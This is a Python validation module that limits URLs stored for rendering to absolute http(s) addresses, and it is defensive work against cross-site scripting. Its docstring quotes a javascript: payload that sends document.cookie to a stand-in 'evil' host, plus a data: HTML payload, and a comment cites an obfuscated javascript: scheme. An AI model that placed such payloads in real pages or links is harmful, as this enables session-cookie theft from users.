"""
URLs we *render*, as opposed to URLs we *fetch*.

`app/core/net.py` guards the outbound direction: an address the server will
connect to, where the danger is reaching something internal. This module
guards the other direction — a stored string that ends up inside an `href` or
an `<img src>` in somebody else's browser, where the danger is a scheme that
executes instead of navigating:

    javascript:fetch('https://evil/'+document.cookie)
    data:text/html;base64,PHNjcmlwdD4…

Neither is an outbound request, so `validate_outbound_url` never sees them,
and both were accepted by every column that took a plain `str`.

Three of these checks already existed, written out three times:

  * `admin/retailers.py::_validate_url` — the buy button
  * `auth/router.py::ProfileUpdate._check_avatar_url` — the review avatar
  * migration 20260823000015 — the same avatar, on the OAuth trigger's side

Brand `website` and `logo_url` had none, and brand `website` is rendered as an
anchor on every brand page (`frontend/src/app/(site)/b/[slug]/page.tsx`). This
is that check, written once.

**Why this matters even though the CSP would stop the script.** A `javascript:`
href does not execute under our nonce-based `script-src` (see
`frontend/src/lib/security-headers.ts`), and that is a real second wall. It is
not the first one, and it is not the only consumer: a URL in this column can
also be read by a feed, an email, an export, or a future page rendered
somewhere the CSP is not ours to set. The value should never have been stored.
"""

from __future__ import annotations

from urllib.parse import urlsplit

#: The only two schemes a stored, rendered link may carry. Everything else —
#: `javascript:`, `data:`, `vbscript:`, `file:`, and any scheme invented later
#: — is refused by omission rather than by blocklist, because a blocklist of
#: dangerous schemes is a list somebody has to keep complete forever.
ALLOWED_LINK_SCHEMES = frozenset({"http", "https"})


def validate_link_url(raw: str | None, *, max_length: int = 500) -> str | None:
    """Return a stored-and-rendered URL, or raise `ValueError`.

    Empty and `None` both return `None`: an absent link is a normal state and
    must not be a validation error, or clearing a field becomes impossible.

    Raises `ValueError` rather than `HTTPException` so it can be used directly
    as a Pydantic `field_validator` — Pydantic turns it into a 422 naming the
    field, which is a better error than a hand-written one. Route handlers that
    need their own wording catch it.
    """
    if raw is None:
        return None

    url = raw.strip()
    if not url:
        return None

    if len(url) > max_length:
        raise ValueError(f"URL is longer than {max_length} characters")

    # Control characters and whitespace are stripped or normalised by URL
    # parsers before the scheme is read, which is how `java\tscript:alert(1)`
    # survives a naive `startswith` test and still executes in a browser.
    if any(ch.isspace() or ord(ch) < 0x20 or ord(ch) == 0x7F for ch in url):
        raise ValueError("URL contains whitespace or control characters")

    try:
        parts = urlsplit(url)
    except ValueError as exc:
        raise ValueError("URL could not be parsed") from exc

    if parts.scheme.lower() not in ALLOWED_LINK_SCHEMES:
        raise ValueError("URL must be an absolute http(s) address")

    # A scheme with no host is `http:evil` — parsed as a relative reference by
    # some consumers and as a host by others, which is exactly the ambiguity
    # worth refusing.
    if not parts.netloc:
        raise ValueError("URL must include a hostname")

    return url
